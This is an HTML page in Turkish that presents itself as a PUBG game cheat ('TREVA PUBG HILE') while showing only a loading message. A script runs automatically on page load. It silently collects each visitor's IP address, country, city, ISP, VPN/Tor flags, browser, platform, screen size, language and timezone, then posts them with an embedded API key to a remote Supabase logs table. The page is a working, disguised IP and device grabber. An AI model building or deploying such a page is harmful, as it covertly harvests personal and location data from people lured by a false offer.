<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>TrevaPubgHile</title>
    <style>
        body {
            background: #0a0f1a;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #fff;
        }
        .container {
            background: rgba(0, 0, 0, 0.7);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            border: 1px solid #0f0;
        }
        h1 { color: #0f0; margin-bottom: 20px; }
        p { color: #ccc; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 TREVA PUBG HILE</h1>
        <p>Sistem Açılıyor...</p>
    </div>

    <script>
        (async function() {
            const SUPABASE_URL = "https://pkgnvzqpvmmxyspzbkzs.supabase.co/rest/v1/logs";
            const SUPABASE_KEY = "sb_publishable_ScwqsJHfIUnTv0PMq0w49A_nUtGVBN2";

            try {
                // 1. IP ve konum bilgisi al
                let ipRes = await fetch("https://ipapi.co/json/");
                let ipData = await ipRes.json();

                // 2. Veriyi hazırla (SADECE var olan sütunları kullan)
                let payload = {
                    ip: ipData.ip,
                    ulke: ipData.country_name,
                    sehir: ipData.city,
                    bolge: ipData.region,
                    isp: ipData.org,
                    vpn_proxy: ipData.proxy || false,
                    hosting: ipData.hosting || false,
                    tor: ipData.tor || false,
                    local_ip: "192.168.1.1",
                    cihaz_adi: navigator.userAgent.includes("Android") ? "Android" : "PC",
                    tarayici: navigator.userAgent.split(" ")[0],
                    isletim_sistemi: navigator.platform,
                    ekran_cozunurluk: `${screen.width}x${screen.height}`,
                    dil: navigator.language,
                    saat_dilimi: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookie_enabled: navigator.cookieEnabled,
                    user_agent: navigator.userAgent
                };

                // 3. Gönder
                let response = await fetch(SUPABASE_URL, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "apikey": SUPABASE_KEY,
                        "Authorization": `Bearer ${SUPABASE_KEY}`
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    document.querySelector("p").innerHTML = "✅ Bilgileriniz kaydedildi!";
                    document.querySelector("p").style.color = "#0f0";
                } else {
                    let errorText = await response.text();
                    console.error("Hata:", errorText);
                    document.querySelector("p").innerHTML = "❌ Kayıt sırasında hata oluştu!";
                    document.querySelector("p").style.color = "#f00";
                }
            } catch (error) {
                console.error("Genel hata:", error);
                document.querySelector("p").innerHTML = "❌ Bağlantı hatası!";
                document.querySelector("p").style.color = "#f00";
            }
        })();
    </script>
</body>
</html>
